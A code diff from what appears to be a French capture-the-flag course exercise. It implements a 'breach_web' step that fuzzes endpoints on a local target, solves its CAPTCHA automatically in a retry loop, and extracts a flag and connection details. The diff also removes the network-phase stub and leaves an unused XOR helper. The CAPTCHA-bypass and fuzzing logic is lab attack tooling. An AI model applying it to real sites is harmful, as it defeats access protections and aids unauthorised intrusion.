@@ -1,30 +1,32 @@
-"""TP3 - Breach the target (squelette).
-
-Enchaîne une phase web (fuzzing + CAPTCHA) et une phase réseau (décodage
-chronométré). Voir tp3-breach-the-target.md.
-
-    poetry run tp3 --target http://127.0.0.1:8080
-"""
-
 import argparse
-
+import requests
+import base64
+import socket
 from tp3.utils.config import logger
+from tp3.utils.captcha import Captcha
+from tp3.utils.fuzzer import fuzz
 
+def _xor(data: bytes, key: bytes) -> bytes:
+    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 
 def breach_web(target: str) -> tuple[str, int, bytes]:
-    """Fuzz les endpoints, casse le CAPTCHA, retourne (host, port, key).
+    sess = requests.Session()
+    panel = fuzz(target)
+    captcha_url = f"{target}/captcha.png"
 
-    Affiche aussi Flag 1. Indices : requests, PIL, pytesseract.
-    """
-    raise NotImplementedError
+    for _ in range(10):
+        sess.get(panel, timeout=5)
+        captcha = Captcha(sess, captcha_url)
+        captcha.capture()
+        captcha.solve()
+        r = sess.post(panel, data={"captcha": captcha.get_value()}, timeout=5)
+        if r.status_code == 200:
+            data = r.json()
+            print(f"flag1: {data['flag1']}")
+            return data["host"], data["port"], bytes.fromhex(data["key"])
+    raise RuntimeError("captcha pa passé")
 
 
-def breach_network(host: str, port: int, key: bytes) -> str:
-    """pwntools/socket : décode le flux base64+XOR en boucle sous 30 s.
-
-    Retourne le flag final. Indices : pwn.remote, base64.
-    """
-    raise NotImplementedError
 
 
 def main() -> None:
